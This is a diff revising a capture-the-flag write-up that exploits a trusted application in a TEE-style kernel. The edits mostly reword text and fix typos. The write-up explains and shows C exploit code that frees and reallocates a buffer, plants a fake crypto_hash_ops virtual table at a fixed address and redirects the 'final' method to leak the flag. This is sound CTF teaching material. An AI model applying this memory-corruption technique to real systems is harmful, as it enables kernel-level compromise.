@@ -563,26 +563,32 @@ TEE_DigestDoFinal(operation,
 	 <output_buffer>, <output_buffer_len>);
 ```
 
-The first call should allocate our gadget object, and the second call should invoke the `final` method. If `sas_do_smc_healthcheck` is called instead of the real `final`, the flag will be written to `output_buffer`.
-
-For the `data` and `data_len` parameters, we can pass any valid data for "hashing". The `hashing_algorithm` parameter is more interesting because it determines which virtual table will be used. The kernel code contains four `crypto_hash_ops` virtual tables:
+The first call should allocate our gadget object, and the second call should invoke the `final` method. 
+If `sas_do_smc_healthcheck` is called instead of the real `final`, the flag will be written to `output_buffer`.
+For the `data` and `data_len` parameters, we can pass any valid data for "hashing". 
+The `hashing_algorithm` parameter is more interesting because it determines which virtual table will be used. 
+The kernel code contains four `crypto_hash_ops` virtual tables:
 
 - `sm3_hash_ops`
 - `ltc_hash_ops`
 - `shake128_ops`
 - `shake256_ops`
 
-All these virtual tables are read-only, so during exploitation we'll need to:
-1. Place a fake virtual table in memory
+But all these virtual tables are read-only, so it means that we need to create our own fake virtual table. 
+Also it means that we can use any value of `hasing_algorithm` parameter (let's choose TEE_ALG_MD5 for example) cause we will use our own virtual table. 
+
+So, during exploitation we'll need to:
+
+1. Place a fake virtual table at known location in kernel memory
 2. Write a pointer to it in the target object
 
-Fortunately, we have many free indices in `syscall_sas` for storing different buffers. In our fake `crypto_hash_ops`:
-- We must write `sas_do_smc_healthcheck` in place of the `final` method
-- For other methods, the simplest solution is to use addresses from the original table to avoid execution errors before reaching the `final` call
+We can achieve this by placing fake table in one of the buffers in `syscall_sas` (we now this address cause there is no ASLR) and writing it's address in the target object. 
+What function's addresses should we write in the fake table?
 
-The exploitation shouldn't depend on which of the four tables we choose, so we'll use:
-- `ltc_hash_ops` as our base
-- `TEE_ALG_MD5` as the `hashing_algorithm`
+- We must write `sas_do_smc_healthcheck` in place of the `final` method
+- For other methods, the simplest solution is to use addresses from the existing valid table to avoid execution errors before reaching the `final` call
+
+It seems that exploitation shouldn't depend on which of the four tables we choose as base for the fake one, so we'll use `ltc_hash_ops` table.
 
 Putting it all together, we get the following exploit code in the TA:
 ```c
@@ -590,7 +596,7 @@ char flag[0x100];
 
 static void exploit(void)
 {
-  // Fake ctypto_hash_ops
+  // Fake crypto_hash_ops
   // All methods are real except final
   // Method final changed to sas_do_smc_healthcheck
   const uint64_t fake_ops[] =
@@ -599,7 +605,7 @@ static void exploit(void)
   };
 
   // Address of index 0 buffer, where fake_ops will be stored
-  // Found in debugger - constant without KASLR
+  // Found in debugger - constant without ASLR
   const uint64_t fake_ops_address = 0xe145480;
 
   // Put fake_ops at fake_ops_address
@@ -611,7 +617,7 @@ static void exploit(void)
   sas_alloc(1, 0x1B0uLL);
   sas_free(1);
 
-  // Allocate ctypto_hash_ctx (reuse buffer with index 1)
+  // Allocate crypto_hash_ctx (reuse buffer with index 1)
   TEE_Result res;
   TEE_OperationHandle operation;
   res = TEE_AllocateOperation(&operation, TEE_ALG_MD5, TEE_MODE_DIGEST, 0);
@@ -621,7 +627,7 @@ static void exploit(void)
     return;
   }
 
-  // Overwrite real pointer to ops with fake one
+  // Overwrite real pointer to ops with the fake one
   sas_write(1, &fake_ops_address, sizeof(fake_ops_address));
 
   // Trigger method final changed to sas_do_smc_healthcheck
@@ -758,8 +764,11 @@ We execute the final version of `xploit` remotely and successfully retrieve the 
 ```
 SAS{fr0m_SEL0_t0_k3rnel_4nd_bey0nd}
 ```
-Complete TA part `xploit` code is [here](./solve/xploit/ta/xploit_ta.c).
 
 ![](./assets/meme4.jpg)
 
-Thanks to @wx0rx and @phoen1xxx for amazing experience.
+Complete TA part of `xploit` code is [here](./solve/xploit/ta/xploit_ta.c).
+
+Reduced version of original task archive is [here](./solve/server-user-reduced.tar.gz)
+
+Thanks to @wx0rx and @phoen1xxx for their help and great teamwork during this task
